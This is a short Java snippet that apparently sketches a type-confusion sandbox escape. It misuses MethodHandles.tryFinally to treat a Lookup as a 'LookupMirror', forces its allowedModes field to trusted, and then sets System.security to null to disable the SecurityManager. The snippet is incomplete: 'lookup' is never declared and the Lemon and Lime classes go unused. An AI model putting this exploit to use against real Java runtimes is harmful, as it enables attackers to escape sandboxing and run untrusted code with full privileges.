class Lemon { Object data; }
class Lime { Object data; }

MethodHandle target = lookup.findStatic(Throwing.class, "throwEx",
    MethodType.methodType(void.class, Lookup.class, int.class));
MethodHandle cleanup = lookup.findStatic(Throwing.class, "handleEx",
    MethodType.methodType(void.class, LookupMirror.class, int.class));

MethodHandle confused = MethodHandles.tryFinally(target, cleanup);

// In handleEx — set allowedModes == TRUSTED
static void handleEx(LookupMirror mirror, int x) {
    Field f = LookupMirror.class.getDeclaredField("allowedModes");
    f.setInt(mirror, -1);
}
// Now disable SecurityManager via trusted lookup
MethodHandle setSM = lookup.findStaticSetter(System.class, "security", SecurityManager.class);
setSM.invoke((SecurityManager) null);
